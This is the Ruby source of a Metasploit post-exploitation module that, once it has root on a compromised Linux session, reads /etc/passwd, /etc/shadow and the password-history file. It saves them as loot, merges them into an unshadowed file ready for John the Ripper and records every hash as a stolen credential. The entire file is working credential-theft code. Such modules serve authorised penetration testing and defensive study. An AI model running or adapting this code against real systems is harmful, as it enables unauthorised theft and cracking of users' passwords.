##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'metasploit/framework/hashes/identify'

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Linux::Priv

  def initialize(info = {})
    super( update_info( info,
      'Name'          => 'Linux Gather Dump Password Hashes for Linux Systems',
      'Description'   => %q{ Post Module to dump the password hashes for all users on a Linux System},
      'License'       => MSF_LICENSE,
      'Author'        => ['Carlos Perez <carlos_perez[at]darkoperator.com>'],
      'Platform'      => ['linux'],
      'SessionTypes'  => ['shell', 'meterpreter']
    ))
  end

  # Run Method for when run command is issued
  def run
    unless is_root?
      fail_with Failure::NoAccess, 'You must run this module as root!'
    end

    passwd_file = read_file('/etc/passwd')
    unless passwd_file.nil?
      p = store_loot("linux.passwd", "text/plain", session, passwd_file, "passwd.tx", "Linux Passwd File")
      vprint_good("passwd saved in: #{p}")
    end

    shadow_file = read_file('/etc/shadow')
    unless shadow_file.nil?
      p = store_loot("linux.shadow", "text/plain", session, shadow_file, "shadow.tx", "Linux Password Shadow File")
      vprint_good("Shadow saved in: #{p}")
    end

    opasswd_file = read_file('/etc/security/opasswd')
    unless opasswd_file.nil?
      p = store_loot("linux.passwd.history", "text/plain", session, opasswd_file, "opasswd.tx", "Linux Passwd History File")
      vprint_good("opasswd saved in: #{p}")
    end

    # Unshadow the files
    john_file = unshadow(passwd_file.to_s, shadow_file.to_s)
    return if john_file == ''

    john_file.each_line do |l|
      hash_parts = l.split(':')
      jtr_format = identify_hash hash_parts[1]

      if jtr_format.empty? #overide the default
        jtr_format = 'des,bsdi,crypt'
      end

      credential_data = {
        jtr_format: jtr_format,
        origin_type: :session,
        post_reference_name: self.refname,
        private_type: :nonreplayable_hash,
        private_data: hash_parts[1],
        session_id: session_db_id,
        username: hash_parts[0],
        workspace_id: myworkspace_id
      }
      create_credential(credential_data)
      print_good(l.chomp)
    end

    # Save passwd file
    upasswd = store_loot("linux.hashes", "text/plain", session, john_file, "unshadowed_passwd.pwd", "Linux Unshadowed Password File")
    print_good("Unshadowed Password File: #{upasswd}")
  end

  def unshadow(pf, sf)
    unshadowed = ''
    sf.each_line do |sl|
      pass = sl.scan(/^\w*:([^:]*)/).join

      next if pass == '*'
      next if pass == '!'

      user = sl.scan(/(^\w*):/).join
      pf.each_line do |pl|
        next unless pl.match(/^#{user}:/)
        unshadowed << pl.gsub(/:x:/,":#{pass}:")
      end
    end

    unshadowed
  end
end
